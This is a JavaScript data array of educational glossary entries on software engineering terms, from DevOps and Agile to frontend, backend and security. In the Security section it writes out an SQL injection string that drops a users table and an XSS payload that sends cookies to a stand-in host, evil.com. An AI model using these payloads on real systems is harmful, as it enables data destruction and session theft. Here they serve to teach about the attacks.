  { term: "Terraform", category: "DevOps & Infrastructure", level: "Intermediate", definition: "An IaC tool that defines cloud infrastructure in declarative configuration files. Works with AWS, GCP, Azure, and 100+ providers.", example: "resource 'aws_instance' 'web' { ami = 'ami-123' instance_type = 't2.micro' } — running 'terraform apply' creates the server. Change the file, re-apply to update." },
  { term: "Monitoring & Observability", category: "DevOps & Infrastructure", level: "Intermediate", definition: "Monitoring: watching predefined metrics (CPU, errors). Observability: understanding internal system state from external outputs (logs, metrics, traces). Three pillars.", example: "Monitoring alerts you that error rate spiked. Observability helps you figure out WHY — trace a failing request through 5 services to find the broken one." },
  { term: "Logging", category: "DevOps & Infrastructure", level: "Foundational", definition: "Recording events, errors, and activities that occur during program execution. Essential for debugging and auditing.", example: "logger.info('User 42 logged in from IP 192.168.1.5'). When something breaks at 3 AM, logs are your only witness. Use structured logging (JSON) for searchability." },
  { term: "Blue-Green Deployment", category: "DevOps & Infrastructure", level: "Intermediate", definition: "Running two identical environments: Blue (current) and Green (new). Switch traffic from Blue to Green when ready. Instant rollback by switching back.", example: "Green environment has the new version, fully tested. Flip the load balancer from Blue to Green — zero downtime. If something's wrong, flip back in seconds." },
  { term: "Canary Deployment", category: "DevOps & Infrastructure", level: "Intermediate", definition: "Rolling out a new version to a small subset of users (canary group) first. Monitor for issues before rolling out to everyone.", example: "Deploy new code to 2% of traffic. Watch error rates for an hour. All good? Gradually increase to 10%, 50%, 100%. Problems? Roll back the 2%." },
  { term: "SRE (Site Reliability Engineering)", category: "DevOps & Infrastructure", level: "Advanced", definition: "A discipline that applies software engineering principles to operations and infrastructure. Treats reliability as a feature. Pioneered by Google.", example: "SRE defines SLOs (99.9% uptime), monitors error budgets, automates toil, conducts blameless postmortems, and builds self-healing systems." },
  { term: "SLA / SLO / SLI", category: "DevOps & Infrastructure", level: "Intermediate", definition: "SLA: contractual agreement with customers (99.9% uptime). SLO: internal target (99.95%). SLI: actual measured metric (99.93% this month).", example: "SLA to customers: 99.9% uptime (≤8.7 hours downtime/year). Internal SLO: 99.95%. SLI shows you're at 99.93% — within SLA but below SLO. Time to improve." },
  { term: "Nginx / Apache", category: "DevOps & Infrastructure", level: "Intermediate", definition: "Web servers that handle HTTP requests. Nginx is event-driven (high concurrency). Apache is process/thread-based. Both serve static files and act as reverse proxies.", example: "Nginx handles 10,000 concurrent connections efficiently. Often placed in front of application servers (Node.js, Django) to handle SSL, caching, and load balancing." },

  // ═══════════════════════════════════════════
  // SOFTWARE ENGINEERING PROCESS
  // ═══════════════════════════════════════════
  { term: "SDLC (Software Development Life Cycle)", category: "Software Engineering Process", level: "Foundational", definition: "The process of planning, creating, testing, and deploying software. Phases: requirements → design → implementation → testing → deployment → maintenance.", example: "Building a banking app: gather requirements from stakeholders → design architecture → developers code → QA tests → deploy to production → maintain and patch." },
  { term: "Agile", category: "Software Engineering Process", level: "Foundational", definition: "A methodology emphasizing iterative development, collaboration, flexibility, and delivering working software in short cycles (sprints).", example: "Instead of spending 2 years building everything before showing it to users, deliver a usable product every 2 weeks. Get feedback, adapt, iterate." },
  { term: "Scrum", category: "Software Engineering Process", level: "Intermediate", definition: "An Agile framework with defined roles (Product Owner, Scrum Master, Dev Team), events (Sprint, Daily Standup, Review, Retro), and artifacts (Backlog, Board).", example: "2-week sprint: team commits to 10 stories. Daily 15-min standup: what I did, what I'll do, any blockers. Sprint review: demo to stakeholders. Retro: how to improve." },
  { term: "Kanban", category: "Software Engineering Process", level: "Intermediate", definition: "A visual workflow management method using a board with columns (To Do, In Progress, Done). Limits work-in-progress. Pull-based, no fixed sprints.", example: "A physical or digital board where cards move from left to right. WIP limit of 3 means only 3 items can be 'In Progress' simultaneously — prevents overload." },
  { term: "Waterfall", category: "Software Engineering Process", level: "Foundational", definition: "A linear, sequential approach where each phase (requirements → design → code → test → deploy) must be completed before the next begins. No going back.", example: "Like building a bridge — you fully design it before laying a single brick. Works for well-understood, unchanging requirements. Poor fit for software that evolves." },
  { term: "User Story", category: "Software Engineering Process", level: "Foundational", definition: "A short description of a feature from the user's perspective. Format: 'As a [role], I want [feature] so that [benefit].'", example: "'As a customer, I want to filter products by price so that I can find items within my budget.' — Captures who, what, and why. Not technical spec." },
  { term: "Sprint", category: "Software Engineering Process", level: "Foundational", definition: "A fixed time period (usually 1-4 weeks) in which a Scrum team completes a set of planned work. Ends with a potentially shippable product increment.", example: "Sprint 7 (2 weeks): Implement user registration, login, and password reset. At the end, these features are working, tested, and deployable." },
  { term: "Technical Debt", category: "Software Engineering Process", level: "Intermediate", definition: "The cost of taking shortcuts in code/design to deliver faster now, at the expense of more work later. Like financial debt — accrue interest over time.", example: "Hardcoding database credentials to ship faster = tech debt. Eventually you MUST fix it (interest payment), and the longer you wait, the harder it gets." },
  { term: "Code Review", category: "Software Engineering Process", level: "Foundational", definition: "The practice of having peers examine your code changes before merging. Catches bugs, improves quality, and spreads knowledge across the team.", example: "You submit a PR, a teammate notices you forgot to handle a null case — a bug caught before it reaches production. Also teaches patterns and standards." },
  { term: "Refactoring", category: "Software Engineering Process", level: "Intermediate", definition: "Restructuring existing code without changing its external behavior. Improves readability, reduces complexity, and makes future changes easier.", example: "A 500-line function doing everything? Refactor into 10 focused functions. The app does the same thing, but the code is now understandable and maintainable." },
  { term: "Pair Programming", category: "Software Engineering Process", level: "Intermediate", definition: "Two developers work together at one workstation. One types (driver), the other reviews and strategizes (navigator). They switch roles regularly.", example: "Junior + Senior pairing: the junior learns patterns in real-time. Two seniors pairing: catch each other's blind spots. Studies show fewer bugs despite seeming slower." },
  { term: "Estimation (Story Points)", category: "Software Engineering Process", level: "Intermediate", definition: "Assigning a relative effort score to user stories, usually using Fibonacci numbers (1, 2, 3, 5, 8, 13). Measures complexity, not time.", example: "'Login page' = 3 points (straightforward). 'Payment integration' = 13 points (complex, uncertain). Team velocity: we complete ~30 points per sprint." },
  { term: "Retrospective", category: "Software Engineering Process", level: "Intermediate", definition: "A meeting at the end of each sprint where the team reflects on what went well, what didn't, and what to improve. Continuous process improvement.", example: "What went well: CI pipeline is fast. What didn't: too many meetings. Action item: cancel non-essential meetings, protect focus time. Actually implement changes." },
  { term: "DRY (Don't Repeat Yourself)", category: "Software Engineering Process", level: "Foundational", definition: "Every piece of knowledge should have a single, authoritative representation. Duplicated code means duplicated bugs and duplicated maintenance.", example: "Tax calculation logic in 5 different files? Move it to one function. Update once, everywhere benefits. Copy-paste is the root of much evil." },
  { term: "KISS (Keep It Simple, Stupid)", category: "Software Engineering Process", level: "Foundational", definition: "Simplicity should be a key design goal. Avoid unnecessary complexity. The simplest solution that works is usually the best.", example: "Don't build a microservices architecture for a blog with 100 users. A monolith with a single database is simpler, cheaper, and perfectly adequate." },
  { term: "YAGNI (You Aren't Gonna Need It)", category: "Software Engineering Process", level: "Foundational", definition: "Don't build features or abstractions until you actually need them. Speculative generality leads to unused, complex code.", example: "Don't build a plugin system, multi-tenancy, and internationalization for your MVP. Build what users need NOW. Add complexity when there's a real requirement." },
  { term: "Semantic Versioning (SemVer)", category: "Software Engineering Process", level: "Intermediate", definition: "Version format: MAJOR.MINOR.PATCH (e.g., 2.4.1). MAJOR: breaking changes. MINOR: new features, backward-compatible. PATCH: bug fixes.", example: "Library goes from 2.4.1 to 3.0.0 — expect breaking changes, update carefully. From 2.4.1 to 2.5.0 — new features, safe to upgrade." },
  { term: "Postmortem / Incident Review", category: "Software Engineering Process", level: "Intermediate", definition: "A blameless analysis after an incident or outage. Documents: what happened, timeline, root cause, what was done, and how to prevent recurrence.", example: "Database outage at 3 AM. Postmortem reveals: disk filled up, no monitoring alert existed, auto-cleanup wasn't configured. Action items: add alerts, implement cleanup cron." },
  { term: "Feature Flag / Feature Toggle", category: "Software Engineering Process", level: "Intermediate", definition: "A configuration mechanism to enable or disable features without deploying new code. Deploy dark features, enable for specific users or percentages.", example: "Deploy the new checkout flow but only enable it for 5% of users. If metrics are good, ramp to 100%. If bad, disable instantly — no rollback needed." },

  // ═══════════════════════════════════════════
  // PROGRAMMING LANGUAGES & PARADIGMS
  // ═══════════════════════════════════════════
  { term: "Programming Paradigm", category: "Programming Languages & Paradigms", level: "Foundational", definition: "A fundamental style or approach to programming. Different paradigms suit different problems. Most modern languages support multiple paradigms.", example: "Imperative (how to do: C), Object-Oriented (things: Java), Functional (transforms: Haskell), Declarative (what to do: SQL), Logical (rules: Prolog)." },
  { term: "Imperative Programming", category: "Programming Languages & Paradigms", level: "Foundational", definition: "Writing explicit step-by-step instructions that change program state. You tell the computer HOW to do something.", example: "total = 0; for each item in cart: total += item.price; — you're explicitly describing each step. C, Python, Java all support this." },
  { term: "Declarative Programming", category: "Programming Languages & Paradigms", level: "Intermediate", definition: "Describing WHAT you want without specifying HOW to do it. The system figures out the steps. SQL, HTML, CSS, React JSX.", example: "SQL: SELECT name FROM users WHERE age > 18. You don't say 'scan each row, check age field, if greater...' — the database figures out the how." },
  { term: "Functional Programming (FP)", category: "Programming Languages & Paradigms", level: "Intermediate", definition: "A paradigm treating computation as evaluation of mathematical functions. Emphasizes: pure functions, immutability, no side effects, higher-order functions.", example: "const doubled = numbers.map(n => n * 2); — no loops, no mutation. The input array is unchanged. The output is a new array. Predictable, testable." },
  { term: "Pure Function", category: "Programming Languages & Paradigms", level: "Intermediate", definition: "A function that: (1) always returns the same output for the same input, and (2) has no side effects (doesn't modify external state).", example: "add(3, 5) always returns 8 — pure. getCurrentTime() returns different values — impure. Math.random() — impure. Pure functions are easy to test and reason about." },
  { term: "Higher-Order Function", category: "Programming Languages & Paradigms", level: "Intermediate", definition: "A function that takes another function as an argument or returns a function. Enables powerful abstractions.", example: "array.filter(x => x > 5) — filter takes a function as an argument. map, reduce, sort all accept functions. This is the core of functional programming." },
  { term: "Closure", category: "Programming Languages & Paradigms", level: "Intermediate", definition: "A function that 'remembers' variables from its enclosing scope, even after the outer function has returned. The function 'closes over' its environment.", example: "function counter() { let count=0; return () => ++count; } const inc = counter(); inc()→1, inc()→2. The inner function remembers 'count' even after counter() returned." },
  { term: "Lambda / Anonymous Function", category: "Programming Languages & Paradigms", level: "Foundational", definition: "A function defined without a name, often used inline as an argument to another function. Concise syntax for small operations.", example: "Python: sorted(items, key=lambda x: x.price). JavaScript: [1,2,3].map(x => x*2). No need to define a named function for a one-liner." },
  { term: "Async / Await", category: "Programming Languages & Paradigms", level: "Intermediate", definition: "Syntax for writing asynchronous code that looks synchronous. 'await' pauses execution until a promise/future resolves, without blocking the thread.", example: "const data = await fetch('/api/users'); — looks like it waits, but the thread is free to handle other requests while waiting for the network response." },
  { term: "Promise / Future", category: "Programming Languages & Paradigms", level: "Intermediate", definition: "An object representing a value that will be available in the future. Can be pending, fulfilled (success), or rejected (error). Foundation of async programming.", example: "fetch('/api/data') returns a Promise. It's pending while the request travels. When data arrives, it's fulfilled. If the server is down, it's rejected." },
  { term: "Event Loop", category: "Programming Languages & Paradigms", level: "Intermediate", definition: "A mechanism that continuously checks for and processes events/callbacks. Core of JavaScript's concurrency model — single-threaded but non-blocking via the event loop.", example: "Node.js: one thread handles thousands of connections. When a DB query is waiting, the event loop picks up the next request. When the query returns, its callback runs." },
  { term: "Generics / Templates", category: "Programming Languages & Paradigms", level: "Intermediate", definition: "Write code that works with any data type without sacrificing type safety. Define once, use with different types.", example: "List<String>, List<Integer> — same List code works for any type. Without generics, you'd need StringList, IntegerList, etc. — code duplication." },
  { term: "Enum (Enumeration)", category: "Programming Languages & Paradigms", level: "Foundational", definition: "A type consisting of a fixed set of named constants. Makes code more readable and prevents invalid values.", example: "enum Status { PENDING, APPROVED, REJECTED } — instead of using magic strings ('pending', 'approved'), use Status.PENDING. Typos caught at compile time." },
  { term: "Exception Handling", category: "Programming Languages & Paradigms", level: "Foundational", definition: "A mechanism for handling runtime errors gracefully using try/catch/finally blocks. Prevents crashes and enables recovery.", example: "try { file = open('data.csv') } catch (FileNotFoundError) { log('File missing, using defaults') } — graceful degradation instead of a crash." },
  { term: "Metaprogramming", category: "Programming Languages & Paradigms", level: "Advanced", definition: "Writing code that generates, modifies, or inspects other code at compile time or runtime. Code that writes code.", example: "Python decorators (@app.route), Java annotations (@Override), Ruby's method_missing, C++ templates, Rust macros — all are metaprogramming." },
  { term: "Reactive Programming", category: "Programming Languages & Paradigms", level: "Advanced", definition: "A paradigm centered on data streams and propagation of change. When data changes, all dependent computations automatically update.", example: "A spreadsheet: change cell A1, all formulas referencing A1 update instantly. In code: RxJS observables, React's state management, real-time dashboards." },
  { term: "Garbage Collected vs Manual Memory", category: "Programming Languages & Paradigms", level: "Intermediate", definition: "GC languages (Java, Python, Go) automatically free unused memory. Manual languages (C, C++) require programmers to allocate/free memory explicitly.", example: "Java: create objects freely, GC cleans up. C: malloc() to allocate, free() when done — forget to free = memory leak. Free twice = crash." },
  { term: "Type Erasure", category: "Programming Languages & Paradigms", level: "Advanced", definition: "Generics information is removed at compile time (Java) or runtime. The compiled code doesn't know the generic type — it's 'erased'.", example: "Java: List<String> and List<Integer> are both just List at runtime. You can't check 'if (list instanceof List<String>)' — the type info is gone." },
  { term: "Coroutine", category: "Programming Languages & Paradigms", level: "Advanced", definition: "A generalizable subroutine that can pause execution (yield) and resume later. More flexible than threads, lighter weight.", example: "Python generators: def fib(): a,b=0,1; while True: yield a; a,b=b,a+b. Each call to next() resumes where it left off. Kotlin coroutines power Android async." },

  // ═══════════════════════════════════════════
  // SECURITY
  // ═══════════════════════════════════════════
  { term: "Authentication vs Authorization", category: "Security", level: "Foundational", definition: "Authentication: verifying WHO you are (identity). Authorization: verifying WHAT you're allowed to do (permissions). AuthN before AuthZ.", example: "Authentication: showing your ID at a building entrance. Authorization: your ID only grants access to floors 1-3, not the executive floor." },
  { term: "Hashing", category: "Security", level: "Intermediate", definition: "Converting input into a fixed-size string using a one-way function. Same input always produces the same hash. Cannot be reversed. Used for password storage.", example: "hash('password123') → 'ef92b778...'. Store the hash, not the password. When user logs in, hash their input and compare. Even if DB is stolen, passwords are safe." },
  { term: "Salt (Cryptographic)", category: "Security", level: "Intermediate", definition: "A random value added to a password before hashing. Prevents rainbow table attacks and ensures identical passwords produce different hashes.", example: "User A and B both have password 'hello'. With salts: hash('hello'+salt_A) ≠ hash('hello'+salt_B). Attackers can't precompute hashes for common passwords." },
  { term: "Encryption (Symmetric vs Asymmetric)", category: "Security", level: "Intermediate", definition: "Symmetric: same key encrypts and decrypts (AES). Asymmetric: public key encrypts, private key decrypts (RSA). Symmetric is faster; asymmetric is used for key exchange.", example: "HTTPS uses both: asymmetric to exchange a symmetric key (handshake), then symmetric encryption for the actual data transfer (fast)." },
  { term: "SQL Injection", category: "Security", level: "Intermediate", definition: "An attack where malicious SQL is inserted into a query through user input. Can read, modify, or delete database data.", example: "Input: ' OR 1=1; DROP TABLE users; --. If the app concatenates this into SQL without sanitizing, the entire users table is deleted. Use parameterized queries." },
  { term: "XSS (Cross-Site Scripting)", category: "Security", level: "Intermediate", definition: "An attack where malicious JavaScript is injected into a web page viewed by other users. Can steal cookies, sessions, or redirect users.", example: "Posting a comment: <script>document.location='evil.com?cookie='+document.cookie</script>. Every user viewing the comment sends their session cookie to the attacker." },
  { term: "CSRF (Cross-Site Request Forgery)", category: "Security", level: "Intermediate", definition: "An attack that tricks an authenticated user's browser into making unintended requests to a site where they're logged in.", example: "You're logged into your bank. You visit a malicious page with a hidden form that submits 'transfer $10000 to attacker'. Your browser includes your bank cookies automatically." },
  { term: "RBAC (Role-Based Access Control)", category: "Security", level: "Intermediate", definition: "Assigning permissions to roles, then assigning roles to users. Users inherit permissions from their roles.", example: "Roles: Admin (full access), Editor (read/write), Viewer (read-only). User Alice gets 'Editor' role → can read and write but can't delete or manage users." },
  { term: "Zero Trust Architecture", category: "Security", level: "Advanced", definition: "A security model that requires verification from everyone attempting to access resources, regardless of whether they're inside or outside the network perimeter.", example: "Traditional: 'You're inside the office network, so you're trusted.' Zero Trust: 'Prove your identity and device health on every single request, even from the office.'" },
  { term: "OWASP Top 10", category: "Security", level: "Intermediate", definition: "A regularly updated list of the 10 most critical web application security risks. The industry standard awareness document for web security.", example: "Includes: Injection, Broken Authentication, Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration, XSS, Insecure Deserialization, and more." },
  { term: "Penetration Testing", category: "Security", level: "Advanced", definition: "Authorized simulated attacks on a system to find security vulnerabilities before real attackers do. Ethical hacking.", example: "A security team attempts to break into your app: SQL injection, brute force, social engineering. They document findings and you fix vulnerabilities before launch." },
  { term: "Certificate / PKI", category: "Security", level: "Advanced", definition: "Digital certificates verify the identity of websites (and other entities). PKI (Public Key Infrastructure) is the system of certificate authorities (CAs) that issue and verify certificates.", example: "When you visit google.com, your browser checks Google's SSL certificate, issued by a trusted CA. This proves you're talking to the real Google, not an impersonator." },

  // ═══════════════════════════════════════════
  // TESTING & QA
  // ═══════════════════════════════════════════
  { term: "Unit Testing", category: "Testing & QA", level: "Foundational", definition: "Testing individual functions or methods in isolation. The smallest testable piece. Fast, numerous, and should be automated.", example: "Test that calculateTax(100, 0.08) returns 8.00. Test that it throws an error for negative prices. Each test checks ONE behavior of ONE function." },
  { term: "Integration Testing", category: "Testing & QA", level: "Intermediate", definition: "Testing how multiple components work together. Verifies that interfaces between modules are correct.", example: "Test that the user registration flow works end-to-end: form submission → API endpoint → database insertion → confirmation email. Each unit works alone, but do they work together?" },
  { term: "End-to-End (E2E) Testing", category: "Testing & QA", level: "Intermediate", definition: "Testing the complete application from the user's perspective. A robot simulates real user actions in a real browser.", example: "Cypress/Playwright: open browser → navigate to login → type credentials → click login → verify dashboard loads → click 'create post' → verify post appears. Full user flow." },
  { term: "Test-Driven Development (TDD)", category: "Testing & QA", level: "Intermediate", definition: "Write tests BEFORE writing code. Red-Green-Refactor cycle: write a failing test (red), write minimal code to pass (green), refactor.", example: "Step 1: write test 'add(2,3) should return 5' — it fails (function doesn't exist). Step 2: write add(a,b) { return a+b } — test passes. Step 3: refactor if needed." },
  { term: "Mock / Stub / Spy", category: "Testing & QA", level: "Intermediate", definition: "Test doubles that replace real dependencies. Mock: verifies interactions. Stub: returns predefined data. Spy: wraps real object and records calls.", example: "Testing a payment service without charging real cards: stub the payment gateway to always return 'success'. Verify your code handles the response correctly." },
  { term: "Code Coverage", category: "Testing & QA", level: "Intermediate", definition: "The percentage of code executed during tests. Types: line coverage, branch coverage, function coverage. 100% coverage doesn't mean zero bugs.", example: "80% line coverage means 20% of your code has never been executed by any test. Branch coverage is stricter — tests both the if AND else paths." },
  { term: "Regression Testing", category: "Testing & QA", level: "Intermediate", definition: "Re-running tests after changes to ensure existing functionality still works. Catches bugs introduced by new code.", example: "You fix a bug in the payment module. Regression tests verify that user registration, search, and checkout still work — you didn't accidentally break them." },
  { term: "Load Testing / Stress Testing", category: "Testing & QA", level: "Intermediate", definition: "Load testing: verify performance under expected load. Stress testing: push beyond limits to find breaking points.", example: "Load test: simulate 10,000 concurrent users (expected peak). Stress test: ramp to 100,000 users — at what point does latency spike? At what point does it crash?" },
  { term: "Test Pyramid", category: "Testing & QA", level: "Intermediate", definition: "A testing strategy: many fast unit tests (base), fewer integration tests (middle), fewest E2E tests (top). Balances speed, coverage, and confidence.", example: "500 unit tests (run in 10 seconds), 50 integration tests (run in 2 minutes), 10 E2E tests (run in 10 minutes). Most bugs caught cheaply at the bottom." },
  { term: "Fuzz Testing", category: "Testing & QA", level: "Advanced", definition: "Automatically generating random, invalid, or unexpected inputs to find crashes, bugs, and security vulnerabilities.", example: "Feed random bytes to a PDF parser. Most inputs are meaningless, but occasionally one crashes the parser — revealing a bug that could be a security vulnerability." },
  { term: "Property-Based Testing", category: "Testing & QA", level: "Advanced", definition: "Instead of testing specific examples, define properties that should ALWAYS hold, and the framework generates hundreds of random inputs to test them.", example: "Property: 'reversing a list twice gives the original list.' Framework tests with [], [1], [1,2,3], [99,0,-5,...] — hundreds of cases you'd never manually write." },

  // ═══════════════════════════════════════════
  // FRONTEND ENGINEERING
  // ═══════════════════════════════════════════
  { term: "HTML (HyperText Markup Language)", category: "Frontend Engineering", level: "Foundational", definition: "The standard markup language for creating web page structure. Defines elements like headings, paragraphs, links, images, forms.", example: "<h1>Welcome</h1><p>This is a paragraph.</p><a href='/about'>About Us</a> — HTML provides the skeleton; CSS provides the skin; JS provides the muscles." },
  { term: "CSS (Cascading Style Sheets)", category: "Frontend Engineering", level: "Foundational", definition: "The language for styling web pages: layout, colors, fonts, spacing, animations. 'Cascading' means styles can inherit and override.", example: "body { font-family: 'Helvetica'; color: #333; } .button { background: blue; border-radius: 8px; } — transforms raw HTML into a beautiful design." },
  { term: "JavaScript", category: "Frontend Engineering", level: "Foundational", definition: "The programming language of the web. Runs in browsers to make pages interactive. Also runs on servers (Node.js). The most widely used language in the world.", example: "Click a button → form validates → data sends to server → page updates without reloading. All powered by JavaScript." },
  { term: "DOM (Document Object Model)", category: "Frontend Engineering", level: "Foundational", definition: "A tree representation of an HTML page that JavaScript can manipulate. Each HTML element is a node in the tree.", example: "document.getElementById('title').textContent = 'New Title'; — JavaScript changes the page by modifying the DOM tree. The browser re-renders the change." },
  { term: "Virtual DOM", category: "Frontend Engineering", level: "Intermediate", definition: "A lightweight copy of the real DOM kept in memory. When state changes, the framework computes the minimal diff and only updates what changed in the real DOM.", example: "React: you change one item in a list of 1000. Virtual DOM diffs and updates only that one <li> element — not all 1000. Performance optimization." },
  { term: "React", category: "Frontend Engineering", level: "Intermediate", definition: "A JavaScript library for building user interfaces with reusable components. Uses JSX (HTML in JavaScript), virtual DOM, and unidirectional data flow.", example: "function UserCard({ name, avatar }) { return <div><img src={avatar}/><h2>{name}</h2></div>; } — a reusable component. Use <UserCard name='Alice' /> anywhere." },
  { term: "Component", category: "Frontend Engineering", level: "Foundational", definition: "A self-contained, reusable piece of UI with its own structure, style, and behavior. The building block of modern frontend frameworks.", example: "A <SearchBar/> component: has an input field, search icon, handles typing events, calls an API. Used on every page without rewriting." },
  { term: "State Management", category: "Frontend Engineering", level: "Intermediate", definition: "Managing and sharing data across components in a frontend application. Local state (component), global state (app-wide), server state (cached API data).", example: "Redux: global store holds app state. Component dispatches action 'ADD_TO_CART' → reducer updates cart state → all components showing cart count re-render automatically." },
  { term: "Responsive Design", category: "Frontend Engineering", level: "Foundational", definition: "Designing web pages that adapt to different screen sizes (mobile, tablet, desktop) using flexible layouts, media queries, and relative units.", example: "A 3-column layout on desktop becomes 1 column on mobile. @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } } — CSS adapts the layout." },
  { term: "SSR vs CSR vs SSG", category: "Frontend Engineering", level: "Intermediate", definition: "SSR (Server-Side Rendering): HTML generated on each request. CSR (Client-Side Rendering): JS builds HTML in browser. SSG (Static Site Generation): HTML generated at build time.", example: "SSR: Next.js renders pages on the server — fast first load, good SEO. CSR: React SPA — blank page until JS loads. SSG: Gatsby — pre-built HTML, fastest but static." },
  { term: "SPA (Single Page Application)", category: "Frontend Engineering", level: "Intermediate", definition: "A web app that loads a single HTML page and dynamically updates content without full page reloads. Navigation is handled by JavaScript.", example: "Gmail: click on an email, the content loads without the page reloading. The URL changes, but the shell (sidebar, header) stays in place. React Router enables this." },
  { term: "Accessibility (a11y)", category: "Frontend Engineering", level: "Intermediate", definition: "Designing and building web content that's usable by people with disabilities. Screen readers, keyboard navigation, color contrast, ARIA attributes.", example: "Adding alt='photo of sunset' to images so screen readers describe them. Using semantic HTML (<nav>, <main>) so assistive technology understands page structure." },
  { term: "CSS Flexbox / Grid", category: "Frontend Engineering", level: "Foundational", definition: "Modern CSS layout systems. Flexbox: 1D layouts (rows OR columns). Grid: 2D layouts (rows AND columns simultaneously).", example: "Flexbox: display:flex; justify-content:space-between; — items spread evenly in a row. Grid: display:grid; grid-template-columns:1fr 2fr 1fr; — 3 columns with different widths." },
  { term: "Webpack / Vite / Bundler", category: "Frontend Engineering", level: "Intermediate", definition: "Tools that combine multiple JavaScript/CSS files into optimized bundles for production. Handle transpilation, minification, code splitting.", example: "Your project has 200 JS files. Webpack bundles them into 3 optimized files, removes dead code, minifies, and adds hashes for caching. Vite does this faster." },
  { term: "TypeScript", category: "Frontend Engineering", level: "Intermediate", definition: "A superset of JavaScript that adds static type checking. Catches type errors at compile time, improves IDE support and documentation.", example: "function greet(name: string): string { return 'Hello ' + name; } — calling greet(42) is a compile-time error. Without TS, it would silently produce 'Hello 42'." },
  { term: "Web Vitals / Performance", category: "Frontend Engineering", level: "Intermediate", definition: "Google's metrics for web page quality. LCP (Largest Contentful Paint): loading. FID (First Input Delay): interactivity. CLS (Cumulative Layout Shift): stability.", example: "LCP < 2.5s = good. Your hero image takes 4s to load? Optimize it: compress, use WebP format, lazy load below-fold images, use a CDN." },

  // ═══════════════════════════════════════════
  // BACKEND ENGINEERING
  // ═══════════════════════════════════════════
  { term: "Server", category: "Backend Engineering", level: "Foundational", definition: "A computer (or program) that responds to requests from clients. Processes business logic, serves data, manages resources.", example: "When you search on Google, your browser (client) sends a request to Google's servers, which process your query and send back results." },
  { term: "REST API Design", category: "Backend Engineering", level: "Intermediate", definition: "Best practices for designing RESTful APIs: use nouns for URLs, HTTP methods for actions, proper status codes, pagination, versioning.", example: "GET /api/v1/users?page=2&limit=20 — good. GET /api/getUsers — bad (verb in URL). Return 201 for creation, 404 for not found, 422 for validation errors." },
  { term: "Middleware", category: "Backend Engineering", level: "Intermediate", definition: "Code that runs between the incoming request and the final route handler. Used for authentication, logging, error handling, CORS, etc.", example: "Request → Auth Middleware (check JWT) → Logging Middleware (log request) → Rate Limit Middleware (check limits) → Route Handler (actual business logic) → Response." },
  { term: "Authentication Flow (Session vs Token)", category: "Backend Engineering", level: "Intermediate", definition: "Session-based: server stores session state, sends session ID cookie. Token-based: server issues JWT, client stores and sends it. Token is stateless and scalable.", example: "Session: server memory holds 'session123 = {userId: 42}'. Token: JWT contains {userId: 42} signed by server — any server can verify it without shared state." },
  { term: "Background Job / Worker", category: "Backend Engineering", level: "Intermediate", definition: "Tasks that run asynchronously, outside the request-response cycle. For long-running or non-urgent work: email sending, image processing, report generation.", example: "User uploads a video. API responds '202 Accepted' immediately. A background worker picks up the job, processes the video, and notifies the user when done." },
  { term: "Cron Job", category: "Backend Engineering", level: "Foundational", definition: "A scheduled task that runs automatically at specified intervals. Named after the Unix cron scheduler.", example: "0 2 * * * cleanup_old_sessions.sh — runs at 2 AM every day. 0 * * * * generate_reports.py — runs every hour on the hour." },
  { term: "Pagination", category: "Backend Engineering", level: "Foundational", definition: "Dividing large result sets into smaller pages. Prevents loading millions of records at once. Types: offset-based, cursor-based.", example: "GET /posts?page=3&size=20 returns posts 41-60. Cursor-based: GET /posts?after=post_40&limit=20 — more efficient for large datasets (no counting rows)." },
  { term: "Webhook vs Polling", category: "Backend Engineering", level: "Intermediate", definition: "Polling: client repeatedly asks 'any updates?' (wasteful). Webhook: server pushes notification to client when something happens (efficient).", example: "Polling: checking your mailbox every 5 minutes. Webhook: a doorbell that rings when mail arrives. Webhooks are more efficient for infrequent events." },
  { term: "Microservice Communication (Sync vs Async)", category: "Backend Engineering", level: "Advanced", definition: "Sync: service A calls service B and waits for response (REST/gRPC). Async: service A sends a message and continues (message queue). Tradeoffs: simplicity vs resilience.", example: "Sync: Order Service calls Payment Service, waits for result. Async: Order Service publishes 'OrderCreated' event, Payment Service processes independently." },
  { term: "API Rate Limiting Algorithms", category: "Backend Engineering", level: "Advanced", definition: "Token Bucket: tokens added at fixed rate, consumed per request. Sliding Window: count requests in a rolling time window. Leaky Bucket: requests processed at constant rate.", example: "Token Bucket: 10 tokens/sec, bucket holds 100. Burst of 100 requests OK, then throttled to 10/sec. Popular choice for API rate limiting (simple, allows bursts)." },
  { term: "Idempotency Key", category: "Backend Engineering", level: "Advanced", definition: "A unique identifier sent with a request to ensure it's processed exactly once, even if retried. Critical for payment processing.", example: "Client sends payment with idempotency_key='abc123'. Network fails, client retries with same key. Server sees 'abc123' was already processed — returns cached result, doesn't charge twice." },
  { term: "N+1 Query Problem", category: "Backend Engineering", level: "Intermediate", definition: "A performance anti-pattern where loading N items triggers N additional database queries (one per item). Solved by eager loading or batching.", example: "Loading 100 blog posts: 1 query to get posts + 100 queries to get each author. Fix: 1 query for posts + 1 query for all authors (eager loading). 101 queries → 2." },

  // ═══════════════════════════════════════════
  // DISTRIBUTED SYSTEMS
  // ═══════════════════════════════════════════
  { term: "Distributed System", category: "Distributed Systems", level: "Intermediate", definition: "A system where components on different networked computers coordinate to achieve a common goal. Appears as a single system to users.", example: "Google Search: thousands of machines work together — index servers, ranking servers, caching servers — but you just see one search box and results." },
  { term: "Consistency Models", category: "Distributed Systems", level: "Advanced", definition: "Rules about when updates to data become visible to readers. Strong: reads always see latest write. Eventual: reads see latest write... eventually.", example: "Strong: bank balance always correct. Eventual: Instagram follower count might be stale for a few seconds but eventually corrects itself." },
  { term: "Consensus Algorithms (Raft / Paxos)", category: "Distributed Systems", level: "Expert", definition: "Algorithms that allow distributed nodes to agree on a value even if some nodes fail. Foundation for distributed databases and leader election.", example: "Raft: nodes elect a leader, leader replicates log entries to followers. If leader dies, a new one is elected automatically. Used in etcd, CockroachDB." },
  { term: "Leader Election", category: "Distributed Systems", level: "Advanced", definition: "The process of designating one node as the coordinator (leader) in a distributed system. The leader makes decisions; followers replicate.", example: "In a distributed database, the leader node handles writes and replicates to followers. If the leader crashes, a new election occurs (Raft/Paxos)." },
  { term: "Split Brain", category: "Distributed Systems", level: "Advanced", definition: "A scenario where a network partition causes different parts of a distributed system to independently believe they are the leader, leading to conflicting actions.", example: "Network splits cluster into two halves. Each half elects its own leader and accepts writes. When the network heals, there are conflicting writes to reconcile." },
